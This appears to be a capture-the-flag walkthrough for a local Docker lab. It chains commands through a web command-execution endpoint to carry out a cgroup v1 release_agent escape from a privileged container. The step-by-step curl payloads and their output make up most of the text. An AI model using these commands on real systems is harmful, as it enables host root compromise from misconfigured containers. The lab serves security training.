# Walkthrough: Matryoshka

## Setup

```
docker compose up --build -d
```

Wait for the container to be ready, then confirm the service is up:

```
curl http://localhost:8080/
```

```json
{
  "service": "MatryoshkaMonitor v2.1",
  "description": "Infrastructure diagnostics console (privileged)"
}
```

## Step 1: identify the misconfiguration

```
curl http://localhost:8080/info
```

```json
{
  "container": "privileged",
  "pid_namespace": "host",
  "cgroup_version": "v1"
}
```

The container is privileged and cgroup v1 is active. The release_agent escape applies.

## Step 2: mount the cgroup v1 memory controller

```
curl "http://localhost:8080/execute?cmd=mkdir+/tmp/cgrp+%26%26+mount+-t+cgroup+-o+memory+cgroup+/tmp/cgrp"
```

```
mkdir: created directory '/tmp/cgrp'
[  OK  ] cgroup memory controller mounted at /tmp/cgrp
```

## Step 3: create a child cgroup and enable notify_on_release

```
curl "http://localhost:8080/execute?cmd=mkdir+/tmp/cgrp/x+%26%26+echo+1+>+/tmp/cgrp/x/notify_on_release"
```

```
mkdir: created directory '/tmp/cgrp/x'
notify_on_release enabled.
```

## Step 4: write the payload script

```
curl "http://localhost:8080/execute?cmd=printf+'%23!/bin/sh\ncat+/flag.txt+>+/tmp/escape_output.txt\n'+>+/cmd.sh+%26%26+chmod+%2Bx+/cmd.sh"
```

```
Script written to /cmd.sh
chmod +x /cmd.sh
```

## Step 5: configure release_agent

```
curl "http://localhost:8080/execute?cmd=echo+/cmd.sh+>+/tmp/cgrp/release_agent"
```

```
release_agent configured. The kernel will execute this path as root on the host.
```

## Step 6: trigger the escape

```
curl "http://localhost:8080/execute?cmd=sh+-c+'echo+%24%24+>+/tmp/cgrp/x/cgroup.procs'"
```

```
Process added to child cgroup. Shell exited. Cgroup now empty.
[kernel] notify_on_release fired: running release_agent as root on host
[kernel] execve('/cmd.sh') -> exit 0
Payload executed. Output written to /tmp/escape_output.txt.
```

## Step 7: read the flag

```
curl "http://localhost:8080/execute?cmd=cat+/tmp/escape_output.txt"
```

```json
{
  "output": "POC{<32 hex chars>}",
  "stage": "ESCAPED"
}
```

The flag is the value of `output`.

## Automated exploit

```
python3 exploit/exploit.py http://localhost:8080
```

```
[*] Target: http://localhost:8080
[*] Container mode: privileged
[*] cgroup version: v1

[*] Step 1 -- mounting cgroup v1 memory controller...
[*] Step 2 -- creating child cgroup with notify_on_release...
[*] Step 3 -- writing payload and configuring release_agent...
[*] Step 4 -- triggering escape via cgroup.procs...
[*] Step 5 -- reading release_agent output...

[+] Flag: POC{<32 hex chars>}
```
